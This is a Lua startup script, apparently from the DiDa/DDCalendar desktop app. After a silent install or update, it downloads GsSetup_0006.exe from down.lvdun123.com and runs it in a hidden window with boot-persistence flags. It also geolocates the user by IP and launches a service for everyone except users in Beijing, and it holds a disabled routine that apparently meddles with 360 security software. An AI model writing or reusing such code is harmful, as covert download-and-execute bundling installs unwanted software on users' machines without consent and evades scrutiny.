local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
local JsonFun = XLGetGlobal("DiDa.Json")
local tipUtil = XLGetObject("API.Util")
local apiAsyn = XLGetObject("API.AsynUtil")
local strIPUrl = "http://ip.dnsexit.com/index.php"
local strIPToCity = "http://int.dpool.sina.com.cn/iplookup/iplookup.php?format=json&ip="

function GTV(obj)
	return "[" .. type(obj) .. "`" .. tostring(obj) .. "]"
end

function Log(str)
	tipUtil:Log(tostring(str))
end

function IsNilString(AString)
	if AString == nil or AString == "" then
		return true
	end
	return false
end


function IsRealString(str)
	return type(str) == "string" and str ~= ""
end


function FetchValueByPath(obj, path)
	local cursor = obj
	for i = 1, #path do
		cursor = cursor[path[i]]
		if cursor == nil then
			return nil
		end
	end
	return cursor
end

--------------360bussiness---
function CheckRepHistory()
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local nLastRepUTC = FetchValueByPath(tUserConfig, {"tExtraCodeInfo", "nLastTSZRepUTC"})
	
	if IsNilString(nLastRepUTC) or FunctionObj.CheckTimeIsAnotherDay(nLastRepUTC) then
		return true
	end

	return false
end

function UpdateRepHistory()
	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	
	if type(tUserConfig["tExtraCodeInfo"]) ~= "table" then
		tUserConfig["tExtraCodeInfo"] = {}
	end
	
	local tExtraCodeInfo = tUserConfig["tExtraCodeInfo"]
	tExtraCodeInfo["nLastTSZRepUTC"] = tipUtil:GetCurrentUTCTime()
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end


function DoFix360Bussiness()
	if type(tipUtil.TryToFix360) ~= "function" then
		return
	end

	local bPassCheck = CheckRepHistory()
	if not bPassCheck then
		return
	end

	tipUtil:TryToFix360()
	UpdateRepHistory()
end


--------------------------GSBussiness---
function DoGSBussiness()
	local bRet, strSource = FunctionObj.GetCommandStrValue("/sstartfrom")
	if not bRet or strSource ~= "installfinish" then
		return
	end

	local bRet, strInsMethod = FunctionObj.GetCommandStrValue("/installmethod")
	if not bRet or strInsMethod ~= "silent" then
		return
	end
	
	local bRet, strInsMethod = FunctionObj.GetCommandStrValue("/installtype")
	if not bRet or strInsMethod ~= "update" then
		return
	end

	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\Path")
	if IsRealString(strGSPath) and tipUtil:QueryFileExists(strGSPath) then
		return 
	end
	
	DownLoadGS()
end


function DownLoadGS()
	local strPacketURL = "http://down.lvdun123.com/client/GsSetup_0006.exe"
	local strSaveDir = tipUtil:GetSystemTempPath()
	local strSavePath = tipUtil:PathCombine(strSaveDir, "GsSetup_0006.exe")
	
	local strStamp = FunctionObj.GetTimeStamp()
	local strURLFix = strPacketURL..strStamp
	
	FunctionObj.NewAsynGetHttpFile(strURLFix, strSavePath, false
	, function(bRet, strRealPath)
			FunctionObj.TipLog("[DownLoadGS] bRet:"..tostring(bRet)
					.." strRealPath:"..tostring(strRealPath))
					
			if 0 ~= bRet then
				return
			end
			
			local strCmd = "/s /run /setboot"
			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
	end)
end


---------------------------AiSvcsBussiness-----
function CheckIsInZone(strProvince,strCity, tBlackCity)
	local tabProvinceInclude = {}
	local tabProvinceExclude = {}
	local tabCityInclude = {}
	local tabCityExclude = {}
	tabInfo = tBlackCity
	
	if type(tabInfo) ~= "table" then
		return true
	end
	local function GetTipZoneInfo()
		--先解析包含的部分
		tabProvinceInclude = FetchValueByPath(tabInfo, {"include", "p"})
		if type(tabProvinceInclude) ~= "table" then
			tabProvinceInclude = {}
		end
		tabCityInclude = FetchValueByPath(tabInfo, {"include", "c"})
		if type(tabCityInclude) ~= "table" then
			tabCityInclude = {}
		end
		--再解析不包含的部分
		tabProvinceExclude = FetchValueByPath(tabInfo, {"exclude", "p"})
		if type(tabProvinceExclude) ~= "table" then
			tabProvinceExclude = {}
		end
		tabCityExclude = FetchValueByPath(tabInfo, {"exclude", "c"})
		if type(tabCityExclude) ~= "table" then
			tabCityExclude = {}
		end
	end
	local bRet = false
	GetTipZoneInfo()
	local bInProvince = false
	local bInCity = false
	local bOutProvince = true
	local bOutCity = true
	if #tabProvinceInclude > 0 or #tabCityInclude>0 then
		for i = 1, #tabProvinceInclude do
			if string.find(strProvince, tabProvinceInclude[i], 1, true) ~= nil then
				bInProvince = true
				break
			end
		end
		if not bInProvince then
			for i = 1, #tabCityInclude do
				if string.find(strCity, tabCityInclude[i], 1, true) ~= nil then
					bInCity = true
					break
				end
			end
		end
	else -- 不包含include 默认为true
		bInProvince = true
		bInCity = true
	end	
	if #tabProvinceExclude > 0 or #tabCityExclude>0 then
		for i = 1, #tabProvinceExclude do
			if string.find(strProvince, tabProvinceExclude[i], 1, true) ~= nil then
				bOutProvince = false
				break
			end
		end
		if bOutProvince then
			for i = 1, #tabCityExclude do
				if string.find(strCity, tabCityExclude[i], 1, true) ~= nil then
					bOutCity = false
					break
				end
			end
		end
	else -- 不包含exclude 默认为true
		bOutProvince = true
		bOutCity = true
	end	
	if (bInProvince or bInCity) and (bOutProvince and bOutCity) then
		bRet = true
	else
		bRet = false
	end
	return bRet
end

function GetCityInfo(fnSuccess,fnFail)
	apiAsyn:AjaxGetHttpContent(strIPUrl, function(iRet, strContent, respHeaders)
		Log("[GetCityInfo] strIPUrl = " .. GTV(strIPUrl) .. ", iRet = " .. GTV(iRet))
		if iRet == 0 then
			local strIP =  string.match(strContent,"(%d+.%d+.%d+.%d+)")
			if IsRealString(strIP) then
				local strQueryIPToCityUrl = strIPToCity .. tostring(strIP)
				apiAsyn:AjaxGetHttpContent(strQueryIPToCityUrl, function(iRet, strContent, respHeaders)
					Log("[GetCityInfo] strQueryIPToCityUrl = " .. GTV(strQueryIPToCityUrl) .. ", iRet = " .. GTV(iRet))
					if iRet == 0 and IsRealString(strContent) then
						local tabCityInfo = JsonFun:decode(strContent)
						if type(tabCityInfo) == "table" then
							local strCity = tabCityInfo["city"]
							local strProvince = tabCityInfo["province"]
							Log("[GetCityInfo] strCity = " .. GTV(strCity) .. ", strProvince = " .. GTV(strProvince))
							if IsRealString(strCity) and IsRealString(strProvince) then
								fnSuccess(strProvince, strCity)
							else
								Log("[GetCityInfo] Get city name failed.")
								fnFail()
							end
						else
							Log("[GetCityInfo] Parse IP to city failed.")
							fnFail()
						end	
					else
						Log("[GetCityInfo] Get IP to city failed.")
						fnFail()
					end
				end)	
			else
				Log("[GetCityInfo] Parse IP failed.")
				fnFail()
			end
		else
			Log("[GetCityInfo] Get IP failed.")
			fnFail()
		end
	end)
end	

function Fail()
	Log("[GetCityInfo] failed.")
end


function Sunccess(strProvince,strCity)
	if type(tipUtil.LaunchUpdateDiDA) == "function" then
	
		local tBlackCity = {
			["exclude"] = {
					["p"] = {"北京"},
					-- ["c"] = {"深圳"},
				}, 
		}
		DoLaunchAI(strProvince,strCity, tBlackCity)
	end
end

	
--拉服务项的业务
function DoLaunchAI(strProvince,strCity, tBlackCity)	
	if not CheckAiSvcsHist() then
		Log("[DoLaunchAI] CheckAiSvcsHist failed")
		return
	end

	if not CheckIsInZone(strProvince,strCity,tBlackCity) then
		Log("[DoLaunchAI] in black city")
		return
	end
	
	local bret = tipUtil:LaunchUpdateDiDA()
	Log("[DoLaunchAI] LaunchUpdateDiDA bret:"..tostring(bret))
	WriteAiSvcsHistory()
end


function CheckAiSvcsHist()
	local tServerParam = LoadServerConfig() or {}
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	local nLaunchAiSvcTime = tUserConfig["nLaunchAiSvcTime"] or 0
	local nSpanTimeInSec = tServerParam["nAISpanTimeInSec"] or 3*24*3600
	local nCurrentTime = tipUtil:GetCurrentUTCTime()
	
	if math.abs(nCurrentTime-nLaunchAiSvcTime) > nSpanTimeInSec then
		return true
	else
		return false
	end
end


function LoadServerConfig()
	local strCfgPath = FunctionObj.GetCfgPathWithName("DiDaServerConfig.dat")
	local infoTable = FunctionObj.LoadTableFromFile(strCfgPath) or {}
	local tParam = FetchValueByPath(infoTable, {"tExtraHelper", "param"})
	return tParam
end


function WriteAiSvcsHistory()
	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
	tUserConfig["nLaunchAiSvcTime"] = tipUtil:GetCurrentUTCTime()
	
	FunctionObj.SaveConfigToFileByKey("tUserConfig")
end
	
	
function DoAiSvcsBussiness()
	if type(JsonFun) ~= "table" then
		return
	end
	
	if type(tipUtil.LaunchUpdateDiDA) ~= "function" then
		return
	end
	
	local strInstallMethod = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\DDCalendar\\InstallMethod")
	if not IsRealString(strInstallMethod) or strInstallMethod~="silent" then
		return 
	end

	GetCityInfo(Sunccess,Fail)
end

------------------------------------	

function main()
	if type(FunctionObj) ~= "table" or tipUtil == nil 
		or apiAsyn == nil then
		return
	end

	-- DoFix360Bussiness()
	DoGSBussiness()
	DoAiSvcsBussiness()
end

main()


